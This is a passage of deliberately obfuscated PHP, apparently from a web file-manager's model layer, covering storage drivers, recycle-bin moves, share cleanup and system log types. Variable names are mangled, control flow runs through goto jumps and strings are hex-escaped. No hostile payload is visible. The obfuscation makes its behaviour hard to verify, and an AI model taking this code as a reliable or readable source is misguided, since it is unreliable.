f«ó®Ë⁄ﬂæ; eÈëÔ©˜ Õ: if ($AÚ‹≥≥™õ´ != !1 && !in_array($Fí«Ú©ï›Ú, $AÚ‹≥≥™õ´)) { continue; } $a†©‰≈ƒñµ = $Dî—¶ÛÏ‰ò->sourceInfo($Fí«Ú©ï›Ú); $Eó´õó¬Î = $Dî—¶ÛÏ‰ò->sourceInfo($a†©‰≈ƒñµ[$Bª°Œõ≥⁄ı[492]]); goto cóÿŒ∏ì¬Ô; D≠√ââçè¶: } goto a˜°ØÉäÇ‘; Fº∑ùÑæ∑©: } private function restoreFolderChildren($D⁄Â÷Æ∆µù, $e°’µ”è∑∞) { goto céÏü úó˜; céÏü úó˜: $Dª∏ã√™ÍÒ =& $_SERVER[’ÿƒ†ïò]; $A´ıÊ˜ΩÀ = Model($Dª∏ã√™ÍÒ[1234]); $cÊΩπ˜ıèı = array($Dª∏ã√™ÍÒ[397] => array($Dª∏ã√™ÍÒ[7], array())); goto dáÈÑÈ’ëŸ; dÁ∑Ë™›àä: $cÊΩπ˜ıèı[$Dª∏ã√™ÍÒ[397]][1] = array_unique($cÊΩπ˜ıèı[$Dª∏ã√™ÍÒ[397]][1]); $cÊΩπ˜ıèı[$Dª∏ã√™ÍÒ[987]] = $Dª∏ã√™ÍÒ[1818]; $A´ıÊ˜ΩÀ->where($cÊΩπ˜ıèı)->setField($Dª∏ã√™ÍÒ[425], 1); goto bıûÿê¡¿„; dáÈÑÈ’ëŸ: foreach ($e°’µ”è∑∞ as $bÚ‰•é∏ƒä) { if ($bÚ‰•é∏ƒä == $D⁄Â÷Æ∆µù) { continue; } if (!$A´ıÊ˜ΩÀ->isParentOf($D⁄Â÷Æ∆µù, $bÚ‰•é∏ƒä)) { continue; } $F–˜¢≠™à® = $A´ıÊ˜ΩÀ->sourceInfo($bÚ‰•é∏ƒä); if ($F–˜¢≠™à®[$Dª∏ã√™ÍÒ[405]] == $Dª∏ã√™ÍÒ[87]) { $cÊΩπ˜ıèı[] = array($Dª∏ã√™ÍÒ[578] => array($Dª∏ã√™ÍÒ[538], $F–˜¢≠™à®[$Dª∏ã√™ÍÒ[515]] . $bÚ‰•é∏ƒä . $Dª∏ã√™ÍÒ[539])); } else { $cÊΩπ˜ıèı[$Dª∏ã√™ÍÒ[397]][1][] = $bÚ‰•é∏ƒä; } } if (!$cÊΩπ˜ıèı[$Dª∏ã√™ÍÒ[397]][1]) { unset($cÊΩπ˜ıèı[$Dª∏ã√™ÍÒ[397]]); } if (!$cÊΩπ˜ıèı) { return; } goto dÁ∑Ë™›àä; bıûÿê¡¿„: } private function recycleMove($fˆã≥€ª€©, $Fˆå®‚í¥∂ = 1) { $AÒÖ∆ãºÜï =& $_SERVER[’ÿƒ†ïò]; $f„Áí•Œ…Œ = Model($AÒÖ∆ãºÜï[1234]); $eò´ÏÖ“¨æ = Model($AÒÖ∆ãºÜï[2023]); $A∂ﬁ®Áªﬁç = array($AÒÖ∆ãºÜï[397] => $fˆã≥€ª€©); if ($Fˆå®‚í¥∂) { $f„Áí•Œ…Œ->where($A∂ﬁ®Áªﬁç)->setField($AÒÖ∆ãºÜï[425], 1); $eò´ÏÖ“¨æ->eventRecycle($fˆã≥€ª€©, $AÒÖ∆ãºÜï[2024]); } else { $AÇøºüﬂ‚ê = $f„Áí•Œ…Œ->where($A∂ﬁ®Áªﬁç)->find(); $F¬£—‹™€´ = $AÇøºüﬂ‚ê[$AÒÖ∆ãºÜï[405]] == $AÒÖ∆ãºÜï[87]; $FúΩ∑Ë°±≥ = $f„Áí•Œ…Œ->fileNameAuto($AÇøºüﬂ‚ê[$AÒÖ∆ãºÜï[492]], $AÇøºüﬂ‚ê[$AÒÖ∆ãºÜï[28]], REPEAT_RENAME_FOLDER, $F¬£—‹™€´); if ($FúΩ∑Ë°±≥ != $AÇøºüﬂ‚ê[$AÒÖ∆ãºÜï[28]]) { $f„Áí•Œ…Œ->rename($fˆã≥€ª€©, $FúΩ∑Ë°±≥); } $f„Áí•Œ…Œ->where($A∂ﬁ®Áªﬁç)->setField($AÒÖ∆ãºÜï[425], 0); $eò´ÏÖ“¨æ->eventRecycle($fˆã≥€ª€©, $AÒÖ∆ãºÜï[2025]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\163\157\165\x72\143\145\x53\x65\x63\162\x65\x74\x4c\151\x73\164"; public $field = array("\x73\157\x75\x72\143\145\x49\x44", "\164\x79\x70\x65\111\104", "\x63\162\145\141\x74\x65\125\163\145\x72"); } goto AÿÂ⁄Ö·ªæ; AÿÂ⁄Ö·ªæ: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\x73\x74\157\x72\141\x67\145\114\x69\163\164"; public $field = array("\156\141\x6d\145", "\163\151\172\x65\115\x61\x78", "\163\171\163\x74\x65\155", "\x64\x65\x66\141\165\154\164", "\144\x72\x69\x76\x65\162", "\143\x6f\x6e\x66\151\147"); public function listData($dü∑ë›çñÜ = false, $c‚øÓÉ≤âÑ = "\155\157\144\x69\x66\171\x54\151\155\x65", $b˜°àÿòÊÈ = false) { $dËªó€ª˜Â =& $_SERVER[’ÿƒ†ïò]; $f–ò¯äç∫∫ = parent::listData($dü∑ë›çñÜ, $c‚øÓÉ≤âÑ, $b˜°àÿòÊÈ); if ($dü∑ë›çñÜ) { return $f–ò¯äç∫∫; } $D¥àÙá¯ãë = $this->ioSizeUseGet(array_to_keyvalue($f–ò¯äç∫∫, $dËªó€ª˜Â[33], $dËªó€ª˜Â[395])); foreach ($f–ò¯äç∫∫ as $f–í§∂Éùπ => $bÉ≤É◊∑øÖ) { unset($f–ò¯äç∫∫[$f–í§∂Éùπ][$dËªó€ª˜Â[6]]); $f–ò¯äç∫∫[$f–í§∂Éùπ][$dËªó€ª˜Â[1712]] = isset($D¥àÙá¯ãë[$bÉ≤É◊∑øÖ[$dËªó€ª˜Â[395]]]) ? $D¥àÙá¯ãë[$bÉ≤É◊∑øÖ[$dËªó€ª˜Â[395]]] : 0; } return $f–ò¯äç∫∫; } public function ioSizeUseGet($fÔí·≤¡†î) { goto DÈﬁ–åÏ√Ù; F‡≠ÔÚ°„…: Cache::set($CØé«πÜµŸ, $BﬂïŒ°ìäß, 600); return $BﬂïŒ°ìäß; goto Eßπ∫¿Ìª¯; fâ∫⁄ãª¢Ó: $B≤’ÍÂ¡´ı = array($fæ÷ºÑõ∂Ê[812] => array($fæ÷ºÑõ∂Ê[7], $fÔí·≤¡†î)); $BﬂïŒ°ìäß = Model($fæ÷ºÑõ∂Ê[775])->field($aöÍ≥Œ⁄∂)->where($B≤’ÍÂ¡´ı)->group($fæ÷ºÑõ∂Ê[812])->select(); $BﬂïŒ°ìäß = array_to_keyvalue($BﬂïŒ°ìäß, $fæ÷ºÑõ∂Ê[395], $fæ÷ºÑõ∂Ê[78]); goto F‡≠ÔÚ°„…; AêêıÙÆ⁄Ÿ: $BﬂïŒ°ìäß = Cache::get($CØé«πÜµŸ); if ($BﬂïŒ°ìäß) { return $BﬂïŒ°ìäß; } $aöÍ≥Œ⁄∂ = array($fæ÷ºÑõ∂Ê[812] => $fæ÷ºÑõ∂Ê[395], $fæ÷ºÑõ∂Ê[2027] => $fæ÷ºÑõ∂Ê[78]); goto fâ∫⁄ãª¢Ó; DÈﬁ–åÏ√Ù: $fæ÷ºÑõ∂Ê =& $_SERVER[’ÿƒ†ïò]; if (!$fÔí·≤¡†î) { return array(); } $CØé«πÜµŸ = $fæ÷ºÑõ∂Ê[2026] . implode($fæ÷ºÑõ∂Ê[47], $fÔí·≤¡†î); goto AêêıÙÆ⁄Ÿ; Eßπ∫¿Ìª¯: } public function getConfig($DÇ©˜êá©) { $Aπﬂ¿ﬁ¡∏Ã = parent::listData($DÇ©˜êá©); return json_decode($Aπﬂ¿ﬁ¡∏Ã[$_SERVER[’ÿƒ†ïò][6]], !0); } public function update($eáœ≥â≥≥È, $Fåª⁄ÀÛÖÙ) { goto báÈ⁄ØË∞Í; báÈ⁄ØË∞Í: $FˆñêÖúÀ¶ =& $_SERVER[’ÿƒ†ïò]; $CõùÒ·§⁄∫ = $Fåª⁄ÀÛÖÙ[$FˆñêÖúÀ¶[28]]; $aà⁄‰ÖùÑÌ = array_to_keyvalue(parent::listData(), $FˆñêÖúÀ¶[28]); goto d–ï„Ò≈ñª; FÌπ‰ÉÁ—ª: $F€ÖÏòÉÓÁ = parent::update($eáœ≥â≥≥È, $Fåª⁄ÀÛÖÙ); if ($F€ÖÏòÉÓÁ && $Fåª⁄ÀÛÖÙ[$FˆñêÖúÀ¶[34]]) { foreach ($aà⁄‰ÖùÑÌ as $dÔãŸ€°è¬) { if ($dÔãŸ€°è¬[$FˆñêÖúÀ¶[34]] && $dÔãŸ€°è¬[$FˆñêÖúÀ¶[395]] != $eáœ≥â≥≥È) { parent::update($dÔãŸ€°è¬[$FˆñêÖúÀ¶[395]], array($FˆñêÖúÀ¶[34] => 0)); } } } return $F€ÖÏòÉÓÁ; goto eßÉØÉ˘è; d–ï„Ò≈ñª: if (isset($aà⁄‰ÖùÑÌ[$CõùÒ·§⁄∫]) && $aà⁄‰ÖùÑÌ[$CõùÒ·§⁄∫][$FˆñêÖúÀ¶[395]] != $eáœ≥â≥≥È) { return !1; } if (isset($Fåª⁄ÀÛÖÙ[$FˆñêÖúÀ¶[2028]]) && $Fåª⁄ÀÛÖÙ[$FˆñêÖúÀ¶[2028]] == $FˆñêÖúÀ¶[87]) { $this->checkConfig($Fåª⁄ÀÛÖÙ); } unset($Fåª⁄ÀÛÖÙ[$FˆñêÖúÀ¶[2028]]); goto FÌπ‰ÉÁ—ª; eßÉØÉ˘è: } public function add($FááÈµƒ»Ë) { goto C·‰öÈ £—; B®ò¡Ê´ç: $this->checkConfig($FááÈµƒ»Ë); $dïõ∏¢ΩΩ∞ = parent::insert($FááÈµƒ»Ë); if ($dïõ∏¢ΩΩ∞ && $FááÈµƒ»Ë[$fûóÁâëÑƒ[34]]) { foreach ($e´ïΩá∞ü as $bãÇŒ∑œ…µ) { if ($bãÇŒ∑œ…µ[$fûóÁâëÑƒ[34]]) { parent::update($bãÇŒ∑œ…µ[$fûóÁâëÑƒ[395]], array($fûóÁâëÑƒ[34] => 0)); } } } goto bÊ∏™≈è‘º; bÊ∏™≈è‘º: return $dïõ∏¢ΩΩ∞; goto BêØ≤™”á∂; C·‰öÈ £—: $fûóÁâëÑƒ =& $_SERVER[’ÿƒ†ïò]; $e´ïΩá∞ü = array_to_keyvalue(parent::listData(), $fûóÁâëÑƒ[28]); if (isset($e´ïΩá∞ü[$FááÈµƒ»Ë[$fûóÁâëÑƒ[28]]])) { return !1; } goto B®ò¡Ê´ç; BêØ≤™”á∂: } public function checkConfig(&$e≠Ÿ¬ëÉ˘º, $Bπ∂†ﬂì√ﬂ = false) { goto fªí◊ﬁüèê; f ∆Àîîä∫: $EÑ¶Éèã∂§ = isset($aãÍŸÖ°¯ë[$cÃ¥Ωêÿ‰ø]) ? $aãÍŸÖ°¯ë[$cÃ¥Ωêÿ‰ø] : ucfirst($cÃ¥Ωêÿ‰ø); $e…¿øÆëﬂæ = $CπÓ§ê«Øè[72] . $EÑ¶Éèã∂§; if (!$EÑ¶Éèã∂§ || !class_exists($e…¿øÆëﬂæ)) { if ($Bπ∂†ﬂì√ﬂ) { return LNG($CπÓ§ê«Øè[2030]); } write_log(array($CπÓ§ê«Øè[2031], $e≠Ÿ¬ëÉ˘º, get_caller_info()), $CπÓ§ê«Øè[2032]); show_json(LNG($CπÓ§ê«Øè[2030]), !1, $e≠Ÿ¬ëÉ˘º); } goto Féüÿ–ùÔç; Féüÿ–ùÔç: $cï§ù‰ÌŒı = new $e…¿øÆëﬂæ($DßÊÖÈÔµÊ); if (in_array($cÃ¥Ωêÿ‰ø, $cï§ù‰ÌŒı->objectDriver)) { if (!$cï§ù‰ÌŒı->isBucketCors() && !$cï§ù‰ÌŒı->setBucketCors()) { $B‚ÍΩ…ä∞… = LNG($CπÓ§ê«Øè[2033]); $B‚ÍΩ…ä∞… .= $CπÓ§ê«Øè[2034] . LNG($CπÓ§ê«Øè[2035]); if ($Bπ∂†ﬂì√ﬂ) { return $B‚ÍΩ…ä∞…; } show_json($B‚ÍΩ…ä∞…, !1); } } $Aö•ä¥ˆ»É = rtrim($DßÊÖÈÔµÊ[$CπÓ§ê«Øè[1104]], $CπÓ§ê«Øè[8]) . $CπÓ§ê«Øè[8]; goto f∫ôÍáÑı«; AØ∫é•Ÿ´: foreach ($DßÊÖÈÔµÊ as $E÷·µ˜Œ€å => $aÜÉÓù›Üâ) { $DßÊÖÈÔµÊ[$E÷·µ˜Œ€å] = trim($aÜÉÓù›Üâ); } $DßÊÖÈÔµÊ[$CπÓ§ê«Øè[2029]] = rand_string(6); $aãÍŸÖ°¯ë = $GLOBALS[$CπÓ§ê«Øè[6]][$CπÓ§ê«Øè[88]][$CπÓ§ê«Øè[821]]; goto f ∆Àîîä∫; fªí◊ﬁüèê: $CπÓ§ê«Øè =& $_SERVER[’ÿƒ†ïò]; $cÃ¥Ωêÿ‰ø = strtolower($e≠Ÿ¬ëÉ˘º[$CπÓ§ê«Øè[94]]); $DßÊÖÈÔµÊ = json_decode($e≠Ÿ¬ëÉ˘º[$CπÓ§ê«Øè[6]], !0); goto AØ∫é•Ÿ´; f∫ôÍáÑı«: $cÚÿÓ„°«¡ = $cï§ù‰ÌŒı->getPath($Aö•ä¥ˆ»É . $CπÓ§ê«Øè[1166]); if (!$cï§ù‰ÌŒı->mkfile($cÚÿÓ„°«¡)) { if ($Bπ∂†ﬂì√ﬂ) { return LNG($CπÓ§ê«Øè[2033]); } show_json(LNG($CπÓ§ê«Øè[2033]), !1); } $DßÊÖÈÔµÊ[$CπÓ§ê«Øè[1104]] = $Aö•ä¥ˆ»É; goto Eá¬ø÷Ô›ç; Eá¬ø÷Ô›ç: $e≠Ÿ¬ëÉ˘º[$CπÓ§ê«Øè[6]] = json_encode($DßÊÖÈÔµÊ); $e≠Ÿ¬ëÉ˘º[$CπÓ§ê«Øè[94]] = $EÑ¶Éèã∂§; return !0; goto EàÚ¨‰ΩÖæ; EàÚ¨‰ΩÖæ: } public function driverListSystem() { $fá¯”ÁìÈç =& $_SERVER[’ÿƒ†ïò]; $c‹ÙêøòΩÖ = parent::listData(); $c¬«˜≤ÉôÇ = array(); foreach ($c‹ÙêøòΩÖ as $a˘œ≥ï„¬®) { unset($a˘œ≥ï„¬®[$fá¯”ÁìÈç[194]], $a˘œ≥ï„¬®[$fá¯”ÁìÈç[84]]); $a˘œ≥ï„¬®[$fá¯”ÁìÈç[6]] = json_decode($a˘œ≥ï„¬®[$fá¯”ÁìÈç[6]], !0); $c¬«˜≤ÉôÇ[] = $a˘œ≥ï„¬®; } return $c¬«˜≤ÉôÇ; } public function defaultDriver() { $Fß∏“ÂÃÿ¿ =& $_SERVER[’ÿƒ†ïò]; $dÊÉáéÉß√ = parent::listData(); $dé°± Â‹Á = array_filter_by_field($dÊÉáéÉß√, $Fß∏“ÂÃÿ¿[34], 1); $dé°± Â‹Á = $dé°± Â‹Á[0]; if ($dé°± Â‹Á) { $dé°± Â‹Á[$Fß∏“ÂÃÿ¿[6]] = json_decode($dé°± Â‹Á[$Fß∏“ÂÃÿ¿[6]], !0); } return $dé°± Â‹Á; } public function driverInfo($Aƒñ∂¥õŒô) { $AáÖÛÍ◊ÙÜ =& $_SERVER[’ÿƒ†ïò]; $c∏«á€»ªç = array_to_keyvalue(parent::listData(), $AáÖÛÍ◊ÙÜ[395]); if (!isset($c∏«á€»ªç[$Aƒñ∂¥õŒô])) { return !1; } $Fµ∂≠â„¥˜ = $c∏«á€»ªç[$Aƒñ∂¥õŒô]; $Fµ∂≠â„¥˜[$AáÖÛÍ◊ÙÜ[6]] = json_decode($Fµ∂≠â„¥˜[$AáÖÛÍ◊ÙÜ[6]], !0); return $Fµ∂≠â„¥˜; } public function remove($d§Ôôÿî±Ã) { $this->removeShareItems($d§Ôôÿî±Ã); return parent::remove($d§Ôôÿî±Ã); } public function removeWithFile($FÒÍº®ÿá¯, $BÔ’⁄πﬂÖ) { goto aºüøÙ¿€µ; E·”‰Ëì”º: $CÚÑ®¨ê≈œ = Model($F∞«Â¥Îûâ[464])->where($a»ÍÜΩ≥’⁄)->sum($F∞«Â¥Îûâ[78]); $Añ €´Œ±ø = $BÔ’⁄πﬂÖ . $F∞«Â¥Îûâ[2036] . $FÒÍº®ÿá¯; $bÎƒÔ”Ñ¡Ω = new TaskFileTransfer($Añ €´Œ±ø, $F∞«Â¥Îûâ[2032], $DÍÎπÎúÂì, LNG($F∞«Â¥Îûâ[2037]) . "\x28{$FÒÍº®ÿá¯}\x29"); goto B´˘˜Ù±áÜ; aºüøÙ¿€µ: $F∞«Â¥Îûâ =& $_SERVER[’ÿƒ†ïò]; $a»ÍÜΩ≥’⁄ = array($F∞«Â¥Îûâ[812] => $FÒÍº®ÿá¯); $DÍÎπÎúÂì = Model($F∞«Â¥Îûâ[464])->where($a»ÍÜΩ≥’⁄)->count(); goto E·”‰Ëì”º; B´˘˜Ù±áÜ: $bÎƒÔ”Ñ¡Ω->task[$F∞«Â¥Îûâ[751]] = (double) $CÚÑ®¨ê≈œ; $fƒöê“·©¥ = KodIO::defaultDriver(); $eÚ·…Ñ¯≤œ = $fƒöê“·©¥[$F∞«Â¥Îûâ[395]]; goto DßΩ∂∫‚Œ–; DßΩ∂∫‚Œ–: $bìˆõ‹ﬁäÌ = "\x7b\x69\157\x3a{$eÚ·…Ñ¯≤œ}\x7d\x2f"; $DªŸ∫›‹áÉ = !0; $dîÕ¨∫ô∆° = array(); goto e”«ï”¡ÑÉ; e”«ï”¡ÑÉ: $Böáì¯◊í° = Model($F∞«Â¥Îûâ[193])->where($a»ÍÜΩ≥’⁄)->field($F∞«Â¥Îûâ[2038])->select(); foreach ($Böáì¯◊í° as $AøÒ∂Ü†‰œ) { goto EìØ·¶ïƒ∂; aãì˜ƒù∞å: $AÑã≈òÂ⁄Î = array($F∞«Â¥Îûâ[812] => $eÚ·…Ñ¯≤œ, $F∞«Â¥Îûâ[76] => $cÿË€‡ÌÚÚ); Model($F∞«Â¥Îûâ[193])->where($a»ÍÜΩ≥’⁄)->save($AÑã≈òÂ⁄Î); goto BÜÁ¿∑¢¯; Eä°≥é∞ £: if (IO::exist($cÿË€‡ÌÚÚ)) { $bÎƒÔ”Ñ¡Ω->updateFileEnd($AøÒ∂Ü†‰œ[$F∞«Â¥Îûâ[28]], $AøÒ∂Ü†‰œ[$F∞«Â¥Îûâ[78]]); continue; } if (!IO::move($dÙı£è‘…·, get_path_father($cÿË€‡ÌÚÚ))) { $DªŸ∫›‹áÉ = !1; break; } $a»ÍÜΩ≥’⁄ = array($F∞«Â¥Îûâ[461] => $AøÒ∂Ü†‰œ[$F∞«Â¥Îûâ[461]]); goto aãì˜ƒù∞å; EìØ·¶ïƒ∂: $dÙı£è‘…· = $AøÒ∂Ü†‰œ[$F∞«Â¥Îûâ[76]]; $cÿË€‡ÌÚÚ = $bìˆõ‹ﬁäÌ . str_replace("\x7b\151\x6f\72{$FÒÍº®ÿá¯}\x7d\x2f", $F∞«Â¥Îûâ[33], $dÙı£è‘…·); if (!IO::exist($dÙı£è‘…·)) { $dîÕ¨∫ô∆°[] = $AøÒ∂Ü†‰œ[$F∞«Â¥Îûâ[461]]; $bÎƒÔ”Ñ¡Ω->updateFileEnd($AøÒ∂Ü†‰œ[$F∞«Â¥Îûâ[28]], $AøÒ∂Ü†‰œ[$F∞«Â¥Îûâ[78]]); continue; } goto Eä°≥é∞ £; BÜÁ¿∑¢¯: } $this->removeByFileID($dîÕ¨∫ô∆°); goto Bà±Â¶ıØ«; Bà±Â¶ıØ«: if (!$DªŸ∫›‹áÉ) { $bÎƒÔ”Ñ¡Ω->stop($Añ €´Œ±ø); return !1; } $bÎƒÔ”Ñ¡Ω->end(); if ($BÔ’⁄πﬂÖ == $F∞«Â¥Îûâ[1692]) { $this->remove($FÒÍº®ÿá¯); } goto Eò˜Ωˆ≈˘Ê; Eò˜Ωˆ≈˘Ê: } public function progress($BèµúœÛõ…, $a≤ÖóŸΩÕ≤) { return Task::get($a≤ÖóŸΩÕ≤ . $_SERVER[’ÿƒ†ïò][2036] . $BèµúœÛõ…); } private function removeByFileID($fôë€µïÒ· = array()) { goto A«‹É ∏Ÿú; A«‹É ∏Ÿú: $b®âÎ•â– =& $_SERVER[’ÿƒ†ïò]; if (empty($fôë€µïÒ·)) { return; } $aÖ«¢çπﬁø = array($b®âÎ•â–[461] => array($b®âÎ•â–[7], $fôë€µïÒ·)); goto C«µ¯°¬ÑÕ; a÷Œ‚≥®áé: foreach ($b‹”›ŒÔêê as $a‚ÜÍÁŸê¢) { Model($b®âÎ•â–[411])->removeNow($a‚ÜÍÁŸê¢, !1); } goto dá±ŒŒ∫™≠; C«µ¯°¬ÑÕ: $b‹”›ŒÔêê = Model($b®âÎ•â–[1234])->where($aÖ«¢çπﬁø)->field($b®âÎ•â–[397])->select(); if (!$b‹”›ŒÔêê) { return; } $b‹”›ŒÔêê = array_to_keyvalue($b‹”›ŒÔêê, $b®âÎ•â–[33], $b®âÎ•â–[397]); goto a÷Œ‚≥®áé; dá±ŒŒ∫™≠: } private function removeShareItems($Bâ∂‘‡‡†∏) { goto Eè≤íöîÂ; b†ÜÆ≈∞ÓÉ: $bâÈ∫Úˆπÿ = Model($bàÂÚà¬ìê[1703])->where($a‘ã•Üî…ù)->field($bàÂÚà¬ìê[482])->select(); if (empty($bâÈ∫Úˆπÿ)) { return; } $eè»ÔÖÈæè = array_to_keyvalue($bâÈ∫Úˆπÿ, $bàÂÚà¬ìê[33], $bàÂÚà¬ìê[482]); goto e∆Ü•Üí–ä; e∆Ü•Üí–ä: Model($bàÂÚà¬ìê[589])->remove($eè»ÔÖÈæè); goto eœÚè‹øù£; Eè≤íöîÂ: $bàÂÚà¬ìê =& $_SERVER[’ÿƒ†ïò]; $aŸÀ≈ØµÖØ = "\x7b\x69\x6f\x3a{$Bâ∂‘‡‡†∏}\x7d\57"; $a‘ã•Üî…ù = array($bàÂÚà¬ìê[397] => 0, $bàÂÚà¬ìê[1099] => array($bàÂÚà¬ìê[381], "{$aŸÀ≈ØµÖØ}\x25")); goto b†ÜÆ≈∞ÓÉ; eœÚè‹øù£: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x4c\151\147\150\x74\x41\x70\x70"; public $modelType = "\123\x79\x73\164\145\155\x4f\x70\x74\x69\157\x6e"; public $field = array("\156\141\155\145", "\147\x72\157\165\x70", "\x64\x65\x73\143", "\x63\157\x6e\164\145\156\164"); public function listData($C‡ãÓ±⁄¿À = false, $E◊ ˜æàÚç = "\155\x6f\x64\x69\146\x79\x54\151\x6d\145", $CÂƒÉ¯Û°ê = true) { return parent::listData($C‡ãÓ±⁄¿À, $E◊ ˜æàÚç, $CÂƒÉ¯Û°ê); } public function remove($cüç¬ÁË∫√) { $cÀÿ‚¿˘˘Á = $this->findByName($cüç¬ÁË∫√); if (!$cÀÿ‚¿˘˘Á) { return !1; } return parent::remove($cÀÿ‚¿˘˘Á[$_SERVER[’ÿƒ†ïò][395]]); } public function add($DÇÏΩ…•øç) { if ($this->findByName($DÇÏΩ…•øç[$_SERVER[’ÿƒ†ïò][28]])) { return !1; } return parent::insert($DÇÏΩ…•øç); } public function update($CÚã—‹îâ§, $C÷∂£Ã«©ù) { $E∂ì±ö‡áÛ =& $_SERVER[’ÿƒ†ïò]; $BÁ«¯‡∫¢≈ = $this->findByName($CÚã—‹îâ§); $F◊€◊œ˜Ø¡ = $this->findByName($C÷∂£Ã«©ù[$E∂ì±ö‡áÛ[28]]); if (!$BÁ«¯‡∫¢≈ || $F◊€◊œ˜Ø¡ && $F◊€◊œ˜Ø¡[$E∂ì±ö‡áÛ[395]] != $BÁ«¯‡∫¢≈[$E∂ì±ö‡áÛ[395]]) { return !1; } return parent::update($BÁ«¯‡∫¢≈[$E∂ì±ö‡áÛ[395]], $C÷∂£Ã«©ù); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\155\x5f\154\x6f\147"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\124\x69\155\x65", "\x74\x69\155\145", "\x69\156\x73\x65\162\164", "\x66\165\156\143\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $B∞úì¨›’Ì =& $_SERVER[’ÿƒ†ïò]; return array($B∞úì¨›’Ì[2039] => LNG($B∞úì¨›’Ì[2040]), $B∞úì¨›’Ì[2041] => LNG($B∞úì¨›’Ì[2042]), $B∞úì¨›’Ì[1666] => LNG($B∞úì¨›’Ì[2043]), $B∞úì¨›’Ì[2044] => LNG($B∞úì¨›’Ì[2045]), $B∞úì¨›’Ì[2046] => LNG($B∞úì¨›’Ì[2047]), $B∞úì¨›’Ì[2048] => LNG($B∞úì¨›’Ì[2049]), $B∞úì¨›’Ì[2050] => LNG($B∞úì¨›’Ì[2051]), $B∞úì¨›’Ì[1696] => LNG($B∞úì¨›’Ì[2051]), $B∞úì¨›’Ì[1697] => LNG($B∞úì¨›’Ì[2052]), $B∞úì¨›’Ì[2053] => LNG($B∞úì¨›’Ì[2054]), $B∞úì¨›’Ì[2055] => LNG($B∞úì¨›’Ì[2056]), $B∞úì¨›’Ì[2057] => LNG($B∞úì¨›’Ì[2058]), $B∞úì¨›’Ì[2059] => LNG($B∞úì¨›’Ì[2060]), $B∞úì¨›’Ì[1694] => LNG($B∞úì¨›’Ì[2061]), $B∞úì¨›’Ì[2062] => LNG($B∞úì¨›’Ì[2063]), $B∞úì¨›’Ì[1701] => LNG($B∞úì¨›’Ì[2064]), $B∞úì¨›’Ì[2065] => LNG($B∞úì¨›’Ì[2066]), $B∞úì¨›’Ì[2067] => LNG($B∞úì¨›’Ì[2068]), $B∞úì¨›’Ì[2069] => LNG($B∞úì¨›’Ì[2070]), $B∞úì¨›’Ì[2071] => LNG($B∞úì¨›’Ì[2072]), $B∞úì¨›’Ì[1704] => LNG($B∞úì¨›’Ì[2073]), $B∞úì¨›’Ì[1705] => LNG($B∞úì¨›’Ì[2074]), $B∞úì¨›’Ì[2075] => LNG($B∞úì¨›’Ì[2076]), $B∞úì¨›’Ì[2077] => LNG($B∞úì¨›’Ì[2078]), $B∞úì¨›’Ì[2079] => LNG($B∞úì¨›’Ì[2080]), $B∞úì¨›’Ì[1699] => LNG($B∞úì¨›’Ì[2081]), $B∞úì¨›’Ì[2082] => LNG($B∞úì¨›’Ì[2083]), $B∞úì¨›’Ì[1698] => LNG($B∞úì¨›’Ì[2084]), $B∞úì¨›’Ì[2085] => LNG($B∞úì¨›’Ì[2086]), $B∞úì¨›’Ì[2087] => LNG($B∞úì¨›’Ì[2088]), $B∞úì¨›’Ì[2089] => LNG($B∞úì¨›’Ì[2090]), $B∞úì¨›’Ì[2091] => LNG($B∞úì¨›’Ì[2091]), $B∞úì¨›’Ì[2092] => LNG($B∞úì¨›’Ì[1670]), $B∞úì¨›’Ì[2093] => LNG($B∞úì¨›’Ì[2094]), $B∞úì¨›’Ì[2095] => LNG($B∞úì¨›’Ì[2096]), $B∞úì¨›’Ì[2097] => LNG($B∞úì¨›’Ì[2098]), $B∞úì¨›’Ì[2099] => LNG($B∞úì¨›’Ì[2100]), $B∞úì¨›’Ì[2101] => LNG($B∞úì¨›’Ì[2102]), $B∞úì¨›’Ì[2103] => LNG($B∞úì¨›’Ì[2103]), $B∞úì¨›’Ì[2104] => LNG($B∞úì¨›’Ì[2105]), $B∞úì¨›’Ì[2106] => LNG($B∞úì¨›’Ì[2107]), $B∞úì¨›’Ì[2108] => LNG($B∞úì¨›’Ì[2109]), $B∞úì¨›’Ì[2110] => LNG($B∞úì¨›’Ì[2111]), $B∞úì¨›’Ì[2112] => LNG($B∞úì¨›’Ì[2113]), $B∞úì¨›’Ì[2114] => LNG($B∞úì¨›’Ì[2115])); } private function typeFile() { $e”õ€•∞–ñ =& $_SERVER[’ÿƒ†ïò]; $d„§†ËêèÆ = array($e”õ€•∞–ñ[1701] => array($e”õ€•∞–ñ[1702]), $e”õ€•∞–ñ[2057] => array($e”õ€•∞–ñ[2116]), $e”õ€•∞–ñ[2059] => array($e”õ€•∞–ñ[2117]), $e”õ€•∞–ñ[1694] => array($e”õ€•∞–ñ[1695]), $e”õ€•∞–ñ[2067] => array(), $e”õ€•∞–ñ[2069] => array(), $e”õ€•∞–ñ[2071] => array(), $e”õ€•∞–ñ[1704] => array($e”õ€•∞–ñ[1706]), $e”õ€•∞–ñ[1705] => array($e”õ€•∞–ñ[1706]), $e”õ€•∞–ñ[2075] => array($e”õ€•∞–ñ[2118]), $e”õ€•∞–ñ[2077] => array($e”õ€•∞–ñ[2118]), $e”õ€•∞–ñ[2079] => array($e”õ€•∞–ñ[2119]), $e”õ€•∞–ñ[2065] => array($e”õ€•∞–ñ[2120]), $e”õ€•∞–ñ[1699] => array($e”õ€•∞–ñ[2121]), $e”õ€•∞–ñ[2082] => array($e”õ€•∞–ñ[2122]), $e”õ€•∞–ñ[1698] => array($e”õ€•∞–ñ[1700])); return $d„§†ËêèÆ; } private function typeAll() { goto d¨ÜÂÀÕõº; Bö≠òï‰§≥: return $D¬ëâˆñ¢º; goto A—Çî€Úµ«; e»â„¶®õ: foreach ($aòáœØ—‡‹ as $eƒêµìê…ë => $EøÍã©Æ°¡) { $D¬ëâˆñ¢º[$EøÍã©Æ°¡[0]] = $D¬ëâˆñ¢º[$eƒêµìê…ë]; } $D¬ëâˆñ¢º[$CãÇØàÙü¶[1706]] = 